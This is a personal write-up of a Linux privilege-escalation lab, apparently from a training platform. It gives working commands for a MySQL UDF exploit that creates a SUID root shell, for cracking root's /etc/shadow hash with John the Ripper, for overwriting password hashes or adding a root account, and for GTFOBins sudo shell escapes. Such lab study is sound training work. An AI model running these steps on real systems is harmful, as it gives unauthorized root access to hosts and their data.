# Linux Privilege Escalation

`ssh user@10.10.168.144 -p 22`

Password is **password321**

Upon running the `id` command.

```ad-success
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

---

## Service Exploits

MySQL service is running as root and the root user does not have a password assigned for that service. 

Running MYSQL with root is very bad idea since he/she can pretty much do anything, create a fake account, delete, drop the database, and more.

It is important to split the privileges, one can perform CRUD, and the other can perform the backup or view local table and such.

In this case we found that MYSQL is running root as a user and setted no password.

Answer [here](https://stackoverflow.com/questions/11059493/good-security-in-mysql-web-application-root-not-root).

We can use popular exploit for User Defined Functions [here](https://www.exploit-db.com/exploits/1518).

---

After gaining access we can download the exploit.

In this case
`cd /home/user/tools/mysql-udf`

Compiling the raptor_udf2.c
`gcc -g -c raptor_udf2.c -fPIC   
`gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc``

After compiling, connect to MYSQL
`mysql -u root`

Execute MYSQL command to create UDF exploit.
`use mysql;   
`create table foo(line blob); `  
`insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));`

`select * from foo into dumpfile'/usr/lib/mysql/plugin/raptor_udf2.so';`   

`create function do_system returns integer soname 'raptor_udf2.so';``

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission
`select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`

Exit MYSQL and run rootbash to open a shell that has root privileges.
`/tmp/rootbash -p`

![[Pasted image 20220726194641.png]]

---

## Weak FIle Permissionns - Readable /etc/shadow

**/etc/shadow** usualyl contains user password hashes and is usually readable only by the root user.

It is **word-writable file** meaning that any user can read,modified, and comprimised other user, Usually word-writable file is only allowed in the **var/tmp** directory since it is intended for storing temporarily files.

After usign `cat /etc/shadow`.
![[Pasted image 20220726195804.png]]

Each line represents a user and in between the first and the second colons is the user's password hash.

Root's hash
**$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0**

Saved root's hash into **hash1.txt**

Uses tool john the ripper for finding weak passwords.

`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

![[Pasted image 20220727162452.png]]

John uses a word lists of password called **rockyou.txt** then tries all hashing algorithm to match the hash file given **THM_root_hash.txt**.

Discovered that the hashing algorithm is **sha512crypt** and the password in plain text is **password123**.

---

## Writable /etc/shadow
Again usually readable by the root user.

Since we got the root's password, now it is the time to change its password.

`mkpasswd -m sha-512 newpasswordhere`, this creates a password with a hashing algorithm of sha-512.

Result:
**$6$mTXOoBKLCRhHse0a$APKGID9JaSmOuRLxLhoK0g4cHZidP1u0kjJFJ/7.ATKde8h.pcWYqzw5T5lBQGwb.EnzxmT6usXisFwPhB..c1**

Now we can edit the **/etc/shadow** file and replace the current hash into our new hash.

![[Pasted image 20220727164033.png]]

---

## Writeable /etc/passwd
The **/etc/passwd** directory contains information about the user accounts and same as above usually **word-writable** by root only.

`openssl passwd newpasswordhere`

**Es3PFW5v0MFIc**

Replace current root password to generated password.

![[Pasted image 20220727165127.png]]

Or we can create a new root account, we only need to copy the root's row then put it at the end of the file replacing only the first instance of root to **newroot**.
![[Pasted image 20220727165333.png]]

---

## Sudo - Shell Escape Sequence
We can see all the programs that the **Super Doer** allows us to run by using the 
command `sudo -l`.

![[Pasted image 20220727170031.png|center]]

We can find programs that allows us to elevate privileges via an escape sequence here [gtfobins](https://gtfobins.github.io/).

`sudo find . -exec /bin/sh \; -quit`
![[Pasted image 20220727170659.png|center]]

``` bash
sudo nano | ^R^X |reset; sh 1>&0 2>&0
```

Got shell access.

---

## Sudo - Environment Variables

```ad-info
title: Environment Variables
Is a name/value pair that is set outside of a program, that can be accessed by the program for configuration purposes.
```

**sudo** can be configured to inherit environment variables from the user's environment.
